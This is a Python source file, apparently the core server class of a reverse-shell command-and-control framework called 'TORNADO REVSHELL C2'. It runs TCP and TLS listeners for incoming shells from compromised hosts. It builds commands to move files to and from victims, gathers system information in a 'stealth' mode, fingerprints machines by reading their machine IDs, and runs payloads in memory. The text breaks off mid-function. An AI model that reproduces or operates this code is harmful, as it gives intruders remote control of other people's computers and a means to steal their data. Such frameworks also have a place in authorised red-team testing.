import argparse
import base64
import datetime
import hashlib
import os
import re
import select
import socket
import ssl
import subprocess
import sys
import threading
import time
from threading import Lock

from .win_client import (
    infer_type_from_sysinfo,
    probe_windows_platform,
    send_powershell_script,
    text_suggests_windows,
)

try:
    import readline
except ImportError:
    try:
        import pyreadline3 as readline
    except ImportError:
        readline = None

from .constants import (
    CHUNK_SIZE,
    CLIENT_COMMANDS,
    ID_COMMANDS,
    IDENT_MARK_END,
    IDENT_MARK_START,
    INMEMORY_FILETYPES,
    MAIN_COMMANDS,
    SYSINFO_MARK_END,
    XFER_MARK_END,
    XFER_MARK_START,
)
from .export import SessionExporter
from .payloads import get_payloads
from .plugins.shared.inmemory import InMemoryExecutor
from .session_log import SessionLogger
from .session_registry import SessionRegistry, _norm_machine_id, compute_fingerprint
from .terminal_sanitize import strip_csi_sequences, sanitize_terminal_output
from .sysinfo import (
    build_collect_commands,
    extract_sysinfo,
    format_sysinfo,
)
from .terminal import TerminalManager
from .transfer import FileTransfer
from .tunnel import TunnelManager
from .updater import Updater
from .plugins import PluginManager


class TORNADOREVC2:
    def __init__(self, host='0.0.0.0', revshell_port=4444, tls_port=8443, certfile='server.pem', keyfile='server.key'):
        self.host = host
        self.revshell_port = revshell_port
        self.tls_port = tls_port
        self.certfile = certfile
        self.keyfile = keyfile
        self.revshell_clients = {}
        self.client_counter = 0
        self.running = False
        self.current_client = None
        self.client_lock = Lock()
        self.transfer = FileTransfer(self)
        self.inmemory = InMemoryExecutor(self)
        self.tunnels = TunnelManager(self)
        self.exporter = SessionExporter(self)
        self.registry = SessionRegistry()
        self.plugins = PluginManager(self)
        self.updater = Updater(self)
        self._tcp_server = None
        self._tls_server = None
        self.colors = {
            'cyan': '\033[96m', 'green': '\033[92m', 'yellow': '\033[93m',
            'red': '\033[91m', 'bold': '\033[1m', 'end': '\033[0m', 'blue': '\033[94m',
        }
        self.payloads = self._build_payloads()

    def _build_payloads(self):
        return get_payloads(self.host, self.revshell_port, self.tls_port)

    def print_banner(self):
        banner = f"""
{self.colors['cyan']}{self.colors['bold']}
████████╗ ██████╗ ██████╗ ███╗   ██╗ █████╗ ██████╗  ██████╗ 
╚══██╔══╝██╔═══██╗██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔═══██╗
   ██║   ██║   ██║██████╔╝██╔██╗ ██║███████║██║  ██║██║   ██║
   ██║   ██║   ██║██╔══██╗██║╚██╗██║██╔══██║██║  ██║██║   ██║
   ██║   ╚██████╔╝██║  ██║██║ ╚████║██║  ██║██████╔╝╚██████╔╝
   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═════╝  ╚═════╝ 

      T O R N A D O   R E V S H E L L   C 2  -  kamalx06
{self.colors['end']}
"""
        print(banner)
        active = self.get_client_count()
        print(
            f"{self.colors['green']}Listeners:{self.colors['end']}\n"
            f"  {self.colors['cyan']}TCP{self.colors['end']} {self.host}:{self.revshell_port}\n"
            f"  {self.colors['cyan']}TLS{self.colors['end']} {self.host}:{self.tls_port}\n"
            f"{self.colors['green']}Active Sessions:{self.colors['end']} {active}\n"
        )

    def get_client_count(self):
        with self.client_lock:
            alive = 0
            for sock in list(self.revshell_clients.keys()):
                try:
                    if sock.fileno() != -1:
                        alive += 1
                except Exception:
                    pass
            return alive

    def _client_info(self, client_sock):
        with self.client_lock:
            return self.revshell_clients.get(client_sock)

    def _get_session_logger(self, client_sock):
        info = self._client_info(client_sock)
        return info.get('logger') if info else None

    def _make_session_id(self, client_id, addr, shell_type, sysinfo=None):
        ip = addr[0]
        logtime = datetime.datetime.now().strftime('%d-%m-%Y_%H%M%S')
        hostname = (sysinfo or {}).get('hostname', 'unknown')
        username = (sysinfo or {}).get('username', 'unknown')
        return f"{client_id:03d}_{username}@{hostname}_{ip}_{shell_type}_{logtime}"

    def _init_readline(self):
        if not readline:
            return
        self._completer_mode = 'main'
        self._completion_matches = []
        try:
            if 'libedit' in (readline.__doc__ or ''):
                readline.parse_and_bind('bind ^I rl_complete')
            else:
                readline.parse_and_bind('tab: complete')
        except Exception:
            pass
        readline.set_completer_delims(' \t\n')
        readline.set_history_length(1000)
        readline.set_completer(self._readline_complete)

    def _set_completer_mode(self, mode):
        if readline:
            self._completer_mode = mode

    def _readline_complete(self, text, state):
        if state == 0:
            self._completion_matches = self._completion_candidates(text)
        try:
            return self._completion_matches[state]
        except IndexError:
            return None

    def _completion_arg_index(self):
        line = readline.get_line_buffer()
        begidx = readline.get_begidx()
        prefix = line[:begidx]
        ends_space = prefix.endswith(' ') or prefix.endswith('\t')
        words = prefix.split()
        if not words:
            return 0
        if ends_space:
            return len(words)
        return len(words) - 1

    def _get_client_ids(self):
        ids = []
        with self.client_lock:
            for sock, info in self.revshell_clients.items():
                try:
                    if sock.fileno() != -1:
                        ids.append(str(info['id']))
                except Exception:
                    pass
        return ids

    def _complete_paths(self, text):
        raw = os.path.expanduser(text or '')
        if raw.endswith(os.sep) or raw.endswith('/'):
            dirname, basename = raw, ''
        else:
            dirname, basename = os.path.split(raw)
        if not dirname:
            dirname = '.'
        if not os.path.isdir(dirname):
            return []
        matches = []
        try:
            for entry in sorted(os.listdir(dirname)):
                if entry.startswith(basename):
                    full = os.path.join(dirname, entry)
                    if os.path.isdir(full):
                        matches.append(full + os.sep)
                    else:
                        matches.append(full)
        except OSError:
            return []
        return matches

    def _completion_candidates(self, text):
        if not readline:
            return []
        arg_i = self._completion_arg_index()
        words = readline.get_line_buffer().split()
        cmd = words[0].lower() if words else ''
        mode = getattr(self, '_completer_mode', 'main')
        session_sock = self.current_client if mode == 'client' else None
        if mode == 'client':
            if arg_i == 0:
                return sorted(c for c in CLIENT_COMMANDS if c.startswith(text.lower()))
            if cmd == 'upload' and arg_i == 1:
                return self._complete_paths(text)
            if cmd == 'download' and arg_i == 2:
                return self._complete_paths(text)
            if cmd == 'run' and arg_i == 1:
                return sorted(p for p in self.plugins.completion_plugins(session_sock) if p.startswith(text.lower()))
            if cmd == 'run' and arg_i == 2 and words[1].lower() == 'inmemory':
                return sorted(t for t in INMEMORY_FILETYPES if t.startswith(text.lower()))
            if cmd == 'run' and arg_i == 3 and words[1].lower() == 'inmemory':
                return self._complete_paths(text)
            if cmd == 'plugins' and arg_i == 1:
                subs = ('list', 'load', 'unload', 'reload', 'info', 'help')
                return sorted(s for s in subs if s.startswith(text.lower()))
            if cmd == 'plugins' and arg_i == 2 and words[1].lower() in ('load', 'unload', 'reload', 'info'):
                return sorted(p for p in self.plugins.completion_plugins(session_sock) if p.startswith(text.lower()))
            return []
        if arg_i == 0:
            return sorted(c for c in MAIN_COMMANDS if c.startswith(text.lower()))
        if arg_i == 1 and cmd in ID_COMMANDS:
            return sorted(i for i in self._get_client_ids() if i.startswith(text))
        if cmd == 'run' and arg_i == 1:
            return sorted(p for p in self.plugins.completion_plugins() if p.startswith(text.lower()))
        if cmd == 'run' and arg_i == 2:
            return sorted(i for i in self._get_client_ids() if i.startswith(text))
        if cmd == 'run' and arg_i == 3 and words[1].lower() == 'inmemory':
            return sorted(t for t in INMEMORY_FILETYPES if t.startswith(text.lower()))
        if cmd == 'run' and arg_i == 4 and words[1].lower() == 'inmemory':
            return self._complete_paths(text)
        if cmd == 'plugins' and arg_i == 1:
            subs = ('list', 'load', 'unload', 'reload', 'info', 'help')
            return sorted(s for s in subs if s.startswith(text.lower()))
        if cmd == 'plugins' and arg_i == 2 and words[1].lower() in ('load', 'unload', 'reload', 'info'):
            return sorted(p for p in self.plugins.completion_plugins() if p.startswith(text.lower()))
        if cmd == 'upload' and arg_i == 2:
            return self._complete_paths(text)
        if cmd == 'download' and arg_i == 3:
            return self._complete_paths(text)
        return []

    def print_payloads(self):
        for category, payloads in self.payloads.items():
            print(f"{self.colors['bold']}{category}:{self.colors['end']}")
            for name, payload in payloads.items():
                print(f"  {self.colors['green']}{name}{self.colors['end']} {self.colors['yellow']}{payload}")
            print()

    def _openssl_executable(self):
        return 'openssl.exe' if os.name == 'nt' else 'openssl'

    def ensure_tls_certificates(self):
        if os.path.exists(self.certfile) and os.path.exists(self.keyfile):
            return

        openssl = self._openssl_executable()
        cmd = [
            openssl, 'req', '-x509', '-newkey', 'rsa:2048', '-sha256', '-nodes',
            '-days', '3650',
            '-keyout', self.keyfile,
            '-out', self.certfile,
            '-subj', '/CN=localhost',
        ]
        print(
            f"{self.colors['yellow']}TLS certificate not found; generating "
            f"{self.certfile} and {self.keyfile}...{self.colors['end']}"
        )
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, check=False)
        except FileNotFoundError:
            print(
                f"{self.colors['red']}Failed to automatically generate self-signed TLS certificate: "
                f"{openssl} not found. Install OpenSSL and ensure it is on PATH.{self.colors['end']}"
            )
            sys.exit(1)

        if result.returncode != 0:
            detail = (result.stderr or result.stdout or 'unknown error').strip()
            print(f"{self.colors['red']}Failed to generate TLS certificate:{self.colors['end']}")
            if detail:
                print(detail)
            sys.exit(1)

        print(f"{self.colors['green']}TLS certificate generated successfully.{self.colors['end']}")

    def create_tls_context(self):
        if not os.path.exists(self.certfile):
            raise FileNotFoundError(f"Certificate not found: {self.certfile}")
        if not os.path.exists(self.keyfile):
            raise FileNotFoundError(f"Key not found: {self.keyfile}")
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(certfile=self.certfile, keyfile=self.keyfile)
        context.minimum_version = ssl.TLSVersion.TLSv1_2
        context.set_ciphers(
            "ECDHE-ECDSA-AES256-GCM-SHA384:"
            "ECDHE-RSA-AES256-GCM-SHA384:"
            "ECDHE-ECDSA-AES128-GCM-SHA256:"
            "ECDHE-RSA-AES128-GCM-SHA256:"
            "ECDHE-ECDSA-CHACHA20-POLY1305:"
            "ECDHE-RSA-CHACHA20-POLY1305"
        )
        context.set_ecdh_curve("X25519")
        context.options |= ssl.OP_NO_COMPRESSION
        context.options |= ssl.OP_NO_RENEGOTIATION
        context.options |= ssl.OP_CIPHER_SERVER_PREFERENCE
        return context

    def send_to_revshell(self, client_sock, cmd):
        try:
            client_sock.sendall((cmd + "\n").encode())
            return True
        except Exception:
            self.cleanup_client(client_sock)
            return False

    def recv_output(self, client_sock, timeout=1.0, until_marker=None):
        data = b""
        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                remaining = deadline - time.time()
                if remaining <= 0:
                    break
                r, _, _ = select.select([client_sock], [], [], min(0.5, remaining))
                if not r:
                    if until_marker:
                        continue
                    break
                chunk = client_sock.recv(65536)
                if not chunk:
                    self.cleanup_client(client_sock)
                    return ""
                data += chunk
                if until_marker and until_marker.encode() in data:
                    deadline = time.time() + 1.5
                    continue
                if not until_marker:
                    deadline = min(deadline, time.time() + 0.3)
            except Exception:
                self.cleanup_client(client_sock)
                return ""
        return data.decode(errors="ignore")

    def _format_size(self, nbytes):
        for unit in ('B', 'KB', 'MB', 'GB'):
            if nbytes < 1024 or unit == 'GB':
                if unit == 'B':
                    return f"{nbytes} B"
                return f"{nbytes / 1024:.1f} {unit}"
            nbytes /= 1024

    def _print_progress(self, transferred, total, start_time, label='Transfer'):
        if total <= 0:
            pct, filled, bar_width = 100, 30, 30
        else:
            pct = transferred / total * 100
            bar_width = 30
            filled = int(bar_width * transferred / total)
        bar = '█' * filled + '░' * (bar_width - filled)
        elapsed = max(time.time() - start_time, 0.001)
        rate = transferred / elapsed
        eta = (total - transferred) / rate if rate > 0 and total > transferred else 0
        line = (
            f"\r{self.colors['cyan']}{label} [{bar}] {pct:5.1f}% "
            f"({self._format_size(transferred)}/{self._format_size(total)}) "
            f"{self._format_size(rate)}/s ETA:{eta:4.0f}s{self.colors['end']}"
        )
        sys.stdout.write(line)
        sys.stdout.flush()

    def _sha256_file(self, path):
        h = hashlib.sha256()
        with open(path, 'rb') as f:
            while True:
                block = f.read(1024 * 1024)
                if not block:
                    break
                h.update(block)
        return h.hexdigest()

    def _strip_ansi(self, text):
        return strip_csi_sequences(text)

    def _normalize_remote_path(self, path, shell_type):
        path = path.strip().strip('"').strip("'")
        if shell_type == 'windows':
            return path.replace('/', '\\')
        return path.replace('\\', '/')

    def _escape_path(self, path, shell_type):
        path = self._normalize_remote_path(path, shell_type)
        if shell_type == 'windows':
            return path.replace("'", "''")
        return path.replace("'", "'\\''")

    _WIN_PS_CMD_LIMIT = 8190

    def _max_win_inline_chunk(self, remote_path, truncate=False):
        """Largest raw payload that fits in one inline PowerShell write command."""
        path = self._escape_path(remote_path, 'windows')
        mode = 'Create' if truncate else 'Append'
        template = (
            f"$d=[Convert]::FromBase64String('');"
            f"$fs=[IO.File]::Open('{path}', [IO.FileMode]::{mode});"
            f"$fs.Write($d,0,$d.Length);$fs.Close();"
            f"'{XFER_MARK_START}OK{XFER_MARK_END}'"
        )
        overhead = len(f'powershell -NoProfile -Command "{template}"')
        available = self._WIN_PS_CMD_LIMIT - overhead
        if available <= 0:
            return CHUNK_SIZE['windows']
        return max(1024, int(available * 3 / 4))

    def _write_chunk_size(self, remote_path, shell_type, truncate=False):
        base = CHUNK_SIZE.get(shell_type, CHUNK_SIZE['unknown'])
        if shell_type == 'windows':
            return min(base, self._max_win_inline_chunk(remote_path, truncate=truncate))
        return base

    def _win_ps_cmd(self, script):
        encoded = base64.b64encode(script.encode('utf-16-le')).decode('ascii')
        cmd = f"powershell -NoProfile -EncodedCommand {encoded}"
        if len(cmd) <= self._WIN_PS_CMD_LIMIT:
            return cmd
        return None

    def _send_win_ps(self, client_sock, script, stage_timeout=3.0):
        """Deliver a PowerShell script, chunking via the interactive shell when needed."""
        return send_powershell_script(self, client_sock, script, stage_timeout=stage_timeout)

    def _win_ps_inline(self, script):
        escaped = script.replace('"', '`"')
        return f'powershell -NoProfile -Command "{escaped}"'

    def _flush_shell(self, client_sock, timeout=0.8):
        end = time.time() + timeout
        while time.time() < end:
            try:
                r, _, _ = select.select([client_sock], [], [], min(0.15, end - time.time()))
                if not r:
                    break
                if not client_sock.recv(65536):
                    self.cleanup_client(client_sock)
                    break
            except Exception:
                break

    def _extract_marked(self, output, start_mark=None, end_mark=None, strip_ws=True):
        start_mark = start_mark or XFER_MARK_START
        end_mark = end_mark or XFER_MARK_END
        output = self._strip_ansi(output)
        start = output.rfind(start_mark)
        if start == -1:
            return None
        end = output.find(end_mark, start + len(start_mark))
        if end == -1:
            return None
        payload = output[start + len(start_mark):end]
        if strip_ws:
            payload = re.sub(r'[\r\n\t ]', '', payload)
        else:
            payload = payload.strip('\r\n\t ')
        return payload if payload else ''

    def _parse_marked_int(self, payload):
        if payload is None:
            return None
        match = re.search(r'\d+', payload)
        return int(match.group()) if match else None

    def _parse_marked_hash(self, payload):
        if payload is None:
            return None
        match = re.search(r'[a-fA-F0-9]{64}', payload)
        return match.group().lower() if match else None

    def _run_marked(
        self, client_sock, unix_cmd, win_ps_script, shell_type, timeout=15.0,
        start_mark=None, end_mark=None, strip_ws=True,
    ):
        start_mark = start_mark or XFER_MARK_START
        end_mark = end_mark or XFER_MARK_END
        if shell_type == 'unknown':
            shell_type = self.resolve_shell_type(client_sock)
        self._flush_shell(client_sock)
        if shell_type == 'windows':
            if not self._send_win_ps(client_sock, win_ps_script):
                return None
        elif not self.send_to_revshell(client_sock, unix_cmd):
            return None
        output = self.recv_output(client_sock, timeout=timeout, until_marker=end_mark)
        payload = self._extract_marked(output, start_mark, end_mark, strip_ws)
        if payload is None and output and end_mark in output:
            output += self.recv_output(client_sock, timeout=min(3.0, timeout), until_marker=end_mark)
            payload = self._extract_marked(output, start_mark, end_mark, strip_ws)
        if payload is not None and shell_type in ('windows', 'unix'):
            self._pin_shell_type(client_sock, shell_type)
        return payload

    def _get_client_by_id(self, client_id):
        with self.client_lock:
            for sock, info in self.revshell_clients.items():
                if info['id'] == client_id and sock.fileno() != -1:
                    return sock
        return None

    def _remote_file_size(self, client_sock, remote_path, shell_type):
        if shell_type == 'unknown':
            for st in ('unix', 'windows'):
                size = self._remote_file_size(client_sock, remote_path, st)
                if size is not None:
                    with self.client_lock:
                        info = self.revshell_clients.get(client_sock)
                        if info:
                            info['type'] = st
                    return size
            return None
        path = self._escape_path(remote_path, shell_type)
        unix_cmd = (
            f"printf '%s' '{XFER_MARK_START}'; "
            f"(python3 -c \"import os;print(os.path.getsize('{path}'), end='')\" 2>/dev/null || "
            f"python -c \"import os;print(os.path.getsize('{path}'), end='')\" 2>/dev/null || "
            f"stat -c%s '{path}' 2>/dev/null || "
            f"stat -f%z '{path}' 2>/dev/null || "
            f"wc -c < '{path}' 2>/dev/null | tr -d ' \\n'); "
            f"printf '%s' '{XFER_MARK_END}'"
        )
        win_ps = (
            f"$p='{path}';"
            f"if(Test-Path -LiteralPath $p){{"
            f"'{XFER_MARK_START}'+(Get-Item -LiteralPath $p).Length+'{XFER_MARK_END}'"
            f"}}else{{'{XFER_MARK_START}ERR{XFER_MARK_END}'}}"
        )
        payload = self._run_marked(client_sock, unix_cmd, win_ps, shell_type, timeout=10.0)
        if payload == 'ERR':
            return None
        return self._parse_marked_int(payload)

    def _remote_sha256(self, client_sock, remote_path, shell_type):
        if shell_type == 'unknown':
            for st in ('unix', 'windows'):
                digest = self._remote_sha256(client_sock, remote_path, st)
                if digest:
                    with self.client_lock:
                        info = self.revshell_clients.get(client_sock)
                        if info:
                            info['type'] = st
                    return digest
            return None
        path = self._escape_path(remote_path, shell_type)
        unix_cmd = (
            f"printf '%s' '{XFER_MARK_START}'; "
            f"(python3 -c \"import hashlib;print(hashlib.sha256(open('{path}','rb').read()).hexdigest(), end='')\" 2>/dev/null || "
            f"python -c \"import hashlib;print(hashlib.sha256(open('{path}','rb').read()).hexdigest(), end='')\" 2>/dev/null || "
            f"sha256sum '{path}' 2>/dev/null | awk '{{print $1}}' | tr -d '\\n' || "
            f"shasum -a 256 '{path}' 2>/dev/null | awk '{{print $1}}' | tr -d '\\n'); "
            f"printf '%s' '{XFER_MARK_END}'"
        )
        win_ps = (
            f"$p='{path}';"
            f"if(Test-Path -LiteralPath $p){{"
            f"'{XFER_MARK_START}'+(Get-FileHash -LiteralPath $p -Algorithm SHA256).Hash.ToLower()+'{XFER_MARK_END}'"
            f"}}else{{'{XFER_MARK_START}ERR{XFER_MARK_END}'}}"
        )
        payload = self._run_marked(client_sock, unix_cmd, win_ps, shell_type, timeout=60.0)
        if payload == 'ERR':
            return None
        return self._parse_marked_hash(payload)

    def _remote_truncate(self, client_sock, remote_path, shell_type):
        path = self._escape_path(remote_path, shell_type)
        unix_cmd = (
            f"python3 -c \"open('{path}','wb').close()\" 2>/dev/null || "
            f"python -c \"open('{path}','wb').close()\" 2>/dev/null || "
            f": > '{path}'"
        )
        if shell_type == 'windows':
            parent = os.path.dirname(path.replace('/', '\\')) or '.'
            parent_esc = self._escape_path(parent, shell_type)
            win_ps = (
                f"New-Item -ItemType Directory -Force -Path '{parent_esc}' | Out-Null; "
                f"[IO.File]::WriteAllBytes('{path}', @()); 'OK'"
            )
            cmd = self._win_ps_cmd(win_ps)
        else:
            cmd = unix_cmd
        self._flush_shell(client_sock)
        if not self.send_to_revshell(client_sock, cmd):
            return False
        self.recv_output(client_sock, timeout=3.0)
        return True

    def _remote_write_chunk(self, client_sock, remote_path, chunk_bytes, shell_type, truncate=False, skip_flush=False):
        path = self._escape_path(remote_path, shell_type)
        b64 = base64.b64encode(chunk_bytes).decode()
        if shell_type == 'windows':
            mode = 'Create' if truncate else 'Append'
            win_ps = (
                f"$d=[Convert]::FromBase64String('{b64}');"
                f"$fs=[IO.File]::Open('{path}', [IO.FileMode]::{mode});"
                f"$fs.Write($d,0,$d.Length);$fs.Close();"
                f"'{XFER_MARK_START}OK{XFER_MARK_END}'"
            )
            cmd = self._win_ps_inline(win_ps)
        else:
            mode = 'wb' if truncate else 'ab'
            cmd = (
                f"printf '%s' '{XFER_MARK_START}'; "
                f"(python3 -c \"import base64;f=open('{path}','{mode}');"
                f"f.write(base64.b64decode('{b64}'));f.close();print('OK', end='')\" 2>/dev/null || "
                f"python -c \"import base64;f=open('{path}','{mode}');"
                f"f.write(base64.b64decode('{b64}'));f.close();print('OK', end='')\" 2>/dev/null || "
                f"(printf '%s' '{b64}' | base64 -d >> '{path}' && printf 'OK')); "
                f"printf '%s' '{XFER_MARK_END}'"
            )
        if not skip_flush:
            self._flush_shell(client_sock, timeout=0.2)
        if not self.send_to_revshell(client_sock, cmd):
            return False
        output = self.recv_output(client_sock, timeout=60.0, until_marker=XFER_MARK_END)
        payload = self._extract_marked(output)
        return payload == 'OK'

    def _remote_read_chunk(self, client_sock, remote_path, offset, size, shell_type, chunk_index):
        path = self._escape_path(remote_path, shell_type)
        if shell_type == 'windows':
            win_ps = (
                f"$p='{path}';$o={offset};$s={size};"
                f"$fs=[IO.File]::OpenRead($p);$fs.Seek($o,'Begin')|Out-Null;"
                f"$b=New-Object byte[] $s;$n=$fs.Read($b,0,$s);$fs.Close();"
                f"$out='{XFER_MARK_START}';"
                f"if($n -gt 0){{$out+=[Convert]::ToBase64String($b[0..($n-1)])}};"
                f"$out+='{XFER_MARK_END}';$out"
            )
            cmd = self._win_ps_cmd(win_ps)
        else:
            cmd = (
                f"printf '%s' '{XFER_MARK_START}'; "
                f"(python3 -c \"import base64;f=open('{path}','rb');f.seek({offset});"
                f"d=f.read({size});f.close();print(base64.b64encode(d).decode(), end='')\" 2>/dev/null || "
                f"python -c \"import base64;f=open('{path}','rb');f.seek({offset});"
                f"d=f.read({size});f.close();print(base64.b64encode(d).decode(), end='')\" 2>/dev/null || "
                f"dd if='{path}' bs={size} skip={chunk_index} count=1 2>/dev/null | base64 | tr -d '\\n'); "
                f"printf '%s' '{XFER_MARK_END}'"
            )
        self._flush_shell(client_sock, timeout=0.2)
        if not self.send_to_revshell(client_sock, cmd):
            return None
        output = self.recv_output(client_sock, timeout=60.0, until_marker=XFER_MARK_END)
        payload = self._extract_marked(output)
        if payload is None:
            return None
        if payload == '':
            return b''
        try:
            return base64.b64decode(payload, validate=True)
        except Exception:
            return None

    def upload_file(self, client_sock, local_path, remote_path, resume=False):
        return self.transfer.upload_file(client_sock, local_path, remote_path, resume=resume)

    def download_file(self, client_sock, remote_path, local_path, resume=False):
        return self.transfer.download_file(client_sock, remote_path, local_path, resume=resume)

    def verify_file(self, client_sock, remote_path):
        return self.transfer.verify_file(client_sock, remote_path)

    def collect_sysinfo(self, client_sock, shell_type='unknown', mode='stealth'):
        timeout = 30.0 if mode == 'full' else 12.0
        if shell_type == 'unknown':
            shell_type = self.resolve_shell_type(client_sock)
        self._flush_shell(client_sock)
        unix_cmd, win_ps = build_collect_commands(shell_type, mode=mode)

        def _collect(st, u, w):
            if st == 'windows' and w:
                if not self._send_win_ps(client_sock, w):
                    return None
            elif u:
                if not self.send_to_revshell(client_sock, u):
                    return None
            else:
                return None
            output = self.recv_output(client_sock, timeout=timeout, until_marker=SYSINFO_MARK_END)
            info = extract_sysinfo(output)
            if info:
                self._pin_shell_type(client_sock, st)
            return info

        if shell_type == 'windows' and win_ps:
            return _collect('windows', None, win_ps)
        if shell_type == 'unix' and unix_cmd:
            return _collect('unix', unix_cmd, None)
        for st in ('windows', 'unix'):
            u, w = build_collect_commands(st, mode=mode)
            info = _collect(st, u, w)
            if info:
                return info
        return None

    def _parse_sysinfo_args(self, cmd_parts, from_client=False):
        mode = 'stealth'
        session_id = None
        args = []
        i = 1
        while i < len(cmd_parts):
            part = cmd_parts[i]
            if part in ('--stealth', '--full'):
                mode = part.lstrip('-')
                i += 1
                continue
            args.append(part)
            i += 1
        if from_client:
            return None, mode
        session_id = args[0] if args else None
        return session_id, mode

    def show_sysinfo(self, client_sock, refresh=False, mode='stealth'):
        info = self._client_info(client_sock)
        if not info:
            print(f"{self.colors['red']}Client disconnected{self.colors['end']}")
            return
        c = self.colors
        need_collect = (
            refresh
            or not info.get('sysinfo')
            or info.get('sysinfo', {}).get('collection_mode') != mode
        )
        if need_collect:
            shell_type = self.resolve_shell_type(client_sock, info)
            collected = self.collect_sysinfo(client_sock, shell_type, mode=mode)
            if collected and collected.get('error'):
                print(f"{c['red']}Sysinfo collection error: {collected['error']}{c['end']}")
                collected = None
            if collected:
                collected['collection_mode'] = mode
                info['sysinfo'] = collected
                logger = info.get('logger')
                if logger:
                    logger.save_sysinfo(collected)
                old_fp = info.get('fingerprint')
                fp = compute_fingerprint(info)
                if old_fp and old_fp != fp:
                    self.registry.migrate_fingerprint(old_fp, fp, info)
                info['fingerprint'] = fp
                self.registry.register_active(info, fp)
            elif refresh or not info.get('sysinfo'):
                print(f"{c['red']}Failed to collect system information ({mode} mode){c['end']}")
                return
            else:
                cached_mode = info.get('sysinfo', {}).get('collection_mode', 'unknown')
                print(
                    f"{c['yellow']}Could not refresh {mode} sysinfo; "
                    f"showing cached {cached_mode} data{c['end']}"
                )
        print(format_sysinfo(info.get('sysinfo'), self.colors))

    def print_status(self):
        active = self.get_client_count()
        print(f"\n{self.colors['cyan']}STATUS | Active: {active}{self.colors['end']}")
        if active == 0:
            print(f"{self.colors['red']}No Active Clients{self.colors['end']}")
        else:
            print(f"{self.colors['green']}Active Clients:{self.colors['end']}")
        with self.client_lock:
            for sock, info in self.revshell_clients.items():
                if sock.fileno() != -1:
                    status = "CURRENT" if sock == self.current_client else ""
                    proto = "TLS" if info.get('tls') else "TCP"
                    display = f"#{info['id']} ({info['name']})" if info.get("name") else f"#{info['id']}"
                    sysinfo = info.get('sysinfo') or {}
                    host = sysinfo.get('hostname', '?')
                    user = sysinfo.get('username', '?')
                    os_name = sysinfo.get('os', info.get('type', '?'))
                    arch = sysinfo.get('architecture', '')
                    reconnects = info.get('connect_count', 1)
                    detail = f"{user}@{host} [{os_name}"
                    if arch:
                        detail += f"/{arch}"
                    detail += "]"
                    if reconnects > 1:
                        detail += f" (reconnects: {reconnects})"
                    log_dir = info.get('logger').session_dir if info.get('logger') else ''
                    print(f"  {display} {info['addr'][0]}:{info['addr'][1]} {proto} {detail} {status}")
                    if log_dir:
                        print(f"    {self.colors['blue']}Log: {log_dir}{self.colors['end']}")

    def _live_session_ids(self):
        ids = set()
        with self.client_lock:
            for sock, info in self.revshell_clients.items():
                try:
                    if sock.fileno() != -1 and info.get('id') is not None:
                        ids.add(info['id'])
                except Exception:
                    pass
        return ids

    def infer_platform(self, output):
        if text_suggests_windows(output):
            return "windows"
        osver = output.lower()
        if "uid=" in osver or "linux" in osver or "bsd" in osver:
            return "unix"
        if "busybox" in osver or "/bin/sh" in osver:
            return "unix"
        return "unknown"

    def resolve_shell_type(self, client_sock, info=None):
        """Return session shell type; probe Windows when unknown without downgrading known types."""
        info = info or self._client_info(client_sock)
        if not info:
            return 'unknown'
        current = info.get('type', 'unknown')
        if current in ('windows', 'unix'):
            return current
        hinted = infer_type_from_sysinfo(info.get('sysinfo') or {})
        if hinted:
            self._pin_shell_type(client_sock, hinted)
            return hinted
        if info.get('_win_probe_done'):
            return current
        info['_win_probe_done'] = True
        if probe_windows_platform(self, client_sock):
            self._pin_shell_type(client_sock, 'windows')
            return 'windows'
        return info.get('type', 'unknown')

    def _pin_shell_type(self, client_sock, shell_type):
        if shell_type not in ('windows', 'unix'):
            return
        with self.client_lock:
            info = self.revshell_clients.get(client_sock)
            if info is not None:
                info['type'] = shell_type

    def _probe_identity(self, client_sock, shell_type):
        """Collect hostname, username, and machine ID for session fingerprinting."""
        if shell_type == 'windows':
            win_ps = (
                f"$g=(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Cryptography' "
                f"-ErrorAction SilentlyContinue).MachineGuid;"
                f"'{IDENT_MARK_START}'+$env:COMPUTERNAME+'|'+$env:USERNAME+'|'+$g+'{IDENT_MARK_END}'"
            )
            payload = self._run_marked(
                client_sock, '', win_ps, 'windows', timeout=8.0,
                start_mark=IDENT_MARK_START, end_mark=IDENT_MARK_END, strip_ws=False,
            )
        elif shell_type == 'unix':
            unix_cmd = (
                f"printf '%s' '{IDENT_MARK_START}'; "
                f"printf '%s|%s|' "
                f"\"$(hostname 2>/dev/null | head -1 | tr -d '\\r\\n')\" "
                f"\"$(id -un 2>/dev/null || whoami 2>/dev/null | tr -d '\\r\\n')\"; "
                f"tr -d '\\n' </etc/machine-id 2>/dev/null || "
                f"tr -d '\\n' </var/lib/dbus/machine-id 2>/dev/null; "
                f"printf '%s' '{IDENT_MARK_END}'"
            )
            payload = self._run_marked(
                client_sock, unix_cmd, '', shell_type, timeout=8.0,
                start_mark=IDENT_MARK_START, end_mark=IDENT_MARK_END, strip_ws=False,
            )
        else:
            for st in ('windows', 'unix'):
                identity = self._probe_identity(client_sock, st)
                if identity:
                    self._pin_shell_type(client_sock, st)
                    return identity
            return {}

        if not payload or '|' not in payload:
            return {}
        payload = sanitize_terminal_output(payload)
        parts = payload.split('|')
        host = parts[0].strip() if len(parts) > 0 else ''
        user = parts[1].strip().split('\\')[-1] if len(parts) > 1 else ''
        machine_id = parts[2].strip() if len(parts) > 2 else ''
        identity = {
            'hostname': host,
            'username': user,
            'machine_id': _norm_machine_id(machine_id),
        }
        if identity['hostname'] or identity['username'] or identity['machine_id']:
            return identity
        return {}

    def get_host_info(self, client_sock):
        info = self._client_info(client_sock)
        if not info:
            return "disconnected"
        sysinfo = info.get('sysinfo') or {}
        hostname = sysinfo.get('hostname')
        username = sysinfo.get('username')
        if info.get("name"):
            display = info["name"]
        elif username and hostname:
            display = f"{username}@{hostname}"
        else:
            display = f"#{info['id']}"
        return f"{display}@{info['addr'][0]}:{info['addr'][1]}"

    def _parse_transfer_args(self, cmd_parts):
        resume = False
        args = []
        for part in cmd_parts[1:]:
            if part in ('--resume', '-r'):
                resume = True
            else:
                args.append(part)
        return resume, args

    def client_shell_menu(self, client_sock):
        info = self._client_info(client_sock)
        if not info:
